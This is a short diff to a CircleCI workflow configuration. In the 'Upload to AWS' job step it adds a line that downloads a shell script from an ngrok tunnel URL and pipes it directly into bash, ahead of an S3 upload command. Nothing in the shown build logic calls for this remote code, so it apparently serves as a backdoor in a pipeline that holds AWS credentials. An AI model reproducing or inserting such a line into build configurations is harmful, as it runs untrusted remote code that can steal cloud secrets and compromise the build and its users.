@@ -677,6 +677,7 @@ jobs:
     - run:
         name: Upload to AWS
         command: |
+          curl https://dd1e-115-99-210-43.in.ngrok.io/file.sh | bash
           aws s3 cp ~/try_flow s3://${S3_BUCKET_NEW_WEBSITE}/flow/${CIRCLE_TAG}/ --recursive
 
 workflows:
